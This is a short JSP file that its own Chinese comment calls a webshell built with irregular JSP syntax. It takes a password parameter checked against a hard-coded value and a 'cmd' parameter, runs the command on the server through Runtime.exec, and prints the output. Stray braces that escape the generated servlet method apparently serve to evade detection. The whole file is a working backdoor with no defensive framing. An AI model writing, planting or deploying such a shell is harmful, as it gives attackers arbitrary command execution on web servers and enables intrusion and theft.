<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--利用不规则的JSP语法实现的webshell--%>
<%
    String ladypwd = request.getParameter("ladypwd");
    String cmd = request.getParameter("cmd");
    setmode(out, ladypwd, cmd);
    }catch(Throwable t) {} finally {_jspxFactory.releasePageContext(_jspx_page_context);}
    }

    public void setmode(JspWriter myout, String ladypwd, String cmd) throws Exception {
        javax.servlet.jsp.JspWriter out = null;
        javax.servlet.jsp.JspWriter _jspx_out = null;
        javax.servlet.jsp.PageContext _jspx_page_context = null;
        javax.servlet.http.HttpServletResponse response = null;

        try {
            if ("shaqima".equals(ladypwd)) {
                InputStream in = Runtime.getRuntime().exec(cmd.split(" ")).getInputStream();
                int ret = -1;
                byte[] bs = new byte[2048];
                myout.print("<pre>");
                while((ret = in.read(bs)) != -1) {
                   myout.println(new String(bs));
                }
                myout.print("</pre>");
            }
%>

